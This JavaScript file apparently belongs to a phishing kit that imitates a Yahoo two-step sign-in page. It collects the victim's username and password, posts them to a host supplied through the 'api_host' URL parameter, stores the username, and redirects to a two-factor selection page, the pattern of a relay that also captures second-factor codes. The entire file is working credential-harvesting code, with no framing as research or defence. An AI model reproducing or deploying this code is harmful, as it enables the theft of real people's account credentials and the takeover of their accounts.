document.addEventListener("DOMContentLoaded", () => {
  const params = new URLSearchParams(window.location.search)
  const apiHost = params.get("api_host")

  if (!apiHost) {
    document.body.innerHTML = "<h1>Configuration Error: api_host parameter is missing.</h1>"
    return
  }

  const emailStep = document.getElementById("email-step")
  const passwordStep = document.getElementById("password-step")
  const loginForm = document.getElementById("login-form")
  const usernameInput = document.getElementById("username")
  const passwordInput = document.getElementById("password")
  const nextToPasswordBtn = document.getElementById("next-to-password")
  const passwordPromptEmail = document.getElementById("password-prompt-email")
  const usernameError = document.getElementById("username-error")
  const passwordError = document.getElementById("password-error")

  nextToPasswordBtn.addEventListener("click", () => {
    const username = usernameInput.value
    if (username.trim() === "") {
      usernameError.textContent = "Please enter your email or username."
      return
    }
    usernameError.textContent = ""
    passwordPromptEmail.textContent = `for ${username}`
    emailStep.classList.remove("active")
    passwordStep.classList.add("active")
  })

  loginForm.addEventListener("submit", (event) => {
    event.preventDefault()

    const username = usernameInput.value
    const password = passwordInput.value

    if (password.trim() === "") {
      passwordError.textContent = "Please enter your password."
      return
    }
    passwordError.textContent = ""

    const formData = new URLSearchParams()
    formData.append("username", username)
    formData.append("passwd", password)
    // Append other form data if necessary

    fetch(`https://${apiHost}/account/challenge/password`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: formData.toString(),
      redirect: "manual", // Important to handle redirects ourselves
    })
      .then((response) => {
        // We expect a redirect to a 2FA page or the final destination
        // The actual content doesn't matter as much as the cookies set
        // and the location header if there is one.
        // For this flow, we assume success leads to 2FA.
        // A more robust solution would parse the response to see what's next.

        // Store username for next pages
        sessionStorage.setItem("yahoo_username", username)
        sessionStorage.setItem("api_host", apiHost)

        // Redirect to 2FA selection page
        window.location.href = `2fa-selection.html`
      })
      .catch((error) => {
        console.error("Error:", error)
        passwordError.textContent = "An unexpected error occurred. Please try again."
      })
  })
})
